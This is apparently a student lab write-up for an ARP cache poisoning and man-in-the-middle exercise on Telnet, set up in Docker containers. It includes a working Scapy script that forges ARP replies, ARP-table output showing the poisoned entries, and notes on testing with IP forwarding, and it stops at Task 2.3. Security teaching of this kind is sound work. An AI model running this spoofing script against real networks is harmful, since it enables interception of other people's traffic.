### Docker config
```shell
seed@VM:~/.../volumes$ dockps
965fffded138  M-10.9.0.105
9cd27edc87ad  B-10.9.0.6
ef3a05ea874d  A-10.9.0.5
```

### Network Config
```shell
M - 10.9.0.105 - 02:42:0a:09:00:69
A - 10.9.0.5   - 02:42:0a:09:00:05
B - 10.9.0.6   - 02:42:0a:09:00:06
```

## Task 2: MITM Attack on Telnet
### Task 2.1: Launch the ARP cache poisoning attack
I first ensured that host A had an ARP cache entry for host B and vice versa. Then, I used the following scapy python script to maliciously overwrite the entries with host M's MAC address:
```python3
#!/usr/bin/env python3
from scapy.all import *

M_mac, M_ip = ("02:42:0a:09:00:69", "10.9.0.105")
A_mac, A_ip = ("02:42:0a:09:00:05", "10.9.0.5")
B_mac, B_ip = ("02:42:0a:09:00:06", "10.9.0.6")
broad_mac = "ff:ff:ff:ff:ff:ff"

#send an ARP request to A associating M's MAC address to B's IP address
E = Ether(dst=A_mac, src=M_mac)
A = ARP()
A.op = 2 #1 for ARP request; 2 for ARP reply
A.hwsrc = M_mac
A.psrc = B_ip
A.hwdst = A_mac
A.pdst = A_ip
sendp(E/A)

#send an ARP request to B associating M's MAC address to A's IP address
E = Ether(dst=B_mac, src=M_mac)
A = ARP()
A.op = 2 #1 for ARP request; 2 for ARP reply
A.hwsrc = M_mac
A.psrc = A_ip
A.hwdst = B_mac
A.pdst = B_ip
sendp(E/A)
```

We can now see the respective ARP tables for hosts A and B:
```shell
root@9cd27edc87ad:/# arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.1                 ether   02:42:31:62:85:b3   C                     eth0
10.9.0.5                 ether   02:42:0a:09:00:69   C                     eth0

root@ef3a05ea874d:/# arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.6                 ether   02:42:0a:09:00:69   C                     eth0
10.9.0.1                 ether   02:42:31:62:85:b3   C                     eth0
```

### Task 2.2: Testing
We first turn off ip forwarding for host M. We then send a ping request from A to B. Below is the wireshark packet capture:
![image](https://github.com/user-attachments/assets/02924e41-eb9f-463f-ab87-c1adb7a9bc4f)
In summary, the ping requests fail, and eventually host A sends out an ARP request to host B who replies with their correct ip address, and the pings begin to succeed again.

### Task 2.3: Turn on IP Forwarding
After we poison the caches again, we turn on ip forwarding for host M. We then send a ping request from A to B. Below is the wireshark packet capture:
